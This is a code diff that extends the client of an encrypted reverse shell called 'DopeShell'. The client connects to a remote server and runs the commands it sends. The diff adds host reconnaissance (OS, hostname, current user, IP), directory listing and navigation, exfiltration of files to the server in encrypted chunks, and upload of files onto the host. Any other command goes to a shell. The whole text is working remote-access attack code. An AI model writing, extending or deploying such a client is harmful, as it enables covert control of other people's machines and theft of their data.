@@ -3,6 +3,9 @@
 import socket
 import subprocess
 import os
+import getpass
+import platform
+import shutil
 import base64
 import argparse
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -59,11 +62,73 @@ class DopeShellclient:
         self.sock.connect((self.server_ip, self.server_port))
         while True:
             command = self.decrypt(self.sock.recv(4096)).decode('utf-8')
+            
             if command.lower() == 'exit':
                 break
-            output = self.execute_command(command)
-            self.sock.send(self.encrypt(output))
+
+            elif command.lower() == 'info':
+                try:
+                    hostname = socket.gethostname()
+                    local_ip = socket.gethostbyname(hostname)
+                except:
+                    local_ip = "Unable to fetch IP"
+
+                client_info = (
+                    f"OS: {platform.system()} {platform.release()}\n"
+                    f"Architecture: {platform.machine()}\n"
+                    f"Hostname: {platform.node()}\n"
+                    f"Processor: {platform.processor()}\n"
+                    f"Current User: {getpass.getuser()}\n"
+                    f"Local IP Address: {local_ip}\n"
+                )
+                self.sock.send(self.encrypt(client_info.encode('utf-8')))
+
+            elif command.lower().startswith('ls'):
+                directory = command.split()[1] if len(command.split()) > 1 else '.'
+                try:
+                    files = "\n".join(os.listdir(directory))
+                except FileNotFoundError:
+                    files = f"[-] Directory '{directory}' not found."
+                self.sock.send(self.encrypt(files.encode('utf-8')))
+
+            elif command.lower() == 'pwd':
+                cwd = os.getcwd()
+                self.sock.send(self.encrypt(cwd.encode('utf-8')))
+
+            elif command.lower().startswith('cd'):
+                directory = command.split()[1] if len(command.split()) > 1 else '.'
+                try:
+                    os.chdir(directory)
+                    self.sock.send(self.encrypt(b"[+] Changed directory."))
+                except FileNotFoundError:
+                    self.sock.send(self.encrypt(f"[-] Directory '{directory}' not found.".encode('utf-8')))
+
+            elif command.lower().startswith('download'):
+                _, file_path = command.split()
+                try:
+                    with open(file_path, 'rb') as f:
+                        while chunk := f.read(4096):
+                            self.sock.send(self.encrypt(chunk))
+                    self.sock.send(self.encrypt(b'EOF'))
+                except FileNotFoundError:
+                    self.sock.send(self.encrypt(b"[-] File not found."))
+
+            elif command.lower().startswith('upload'):
+                _, file_name = command.split()
+                with open(file_name, 'wb') as f:
+                    while True:
+                        file_data = self.decrypt(self.sock.recv(4096))
+                        if file_data == b'EOF':
+                            break
+                        f.write(file_data)
+                self.sock.send(self.encrypt(b"[+] File upload complete."))
+
+            else:
+                output = self.execute_command(command)
+                self.sock.send(self.encrypt(output))
+
         self.sock.close()
+
 
 def main():
     parser = argparse.ArgumentParser(description="DopeShell Reverse Shell Client")
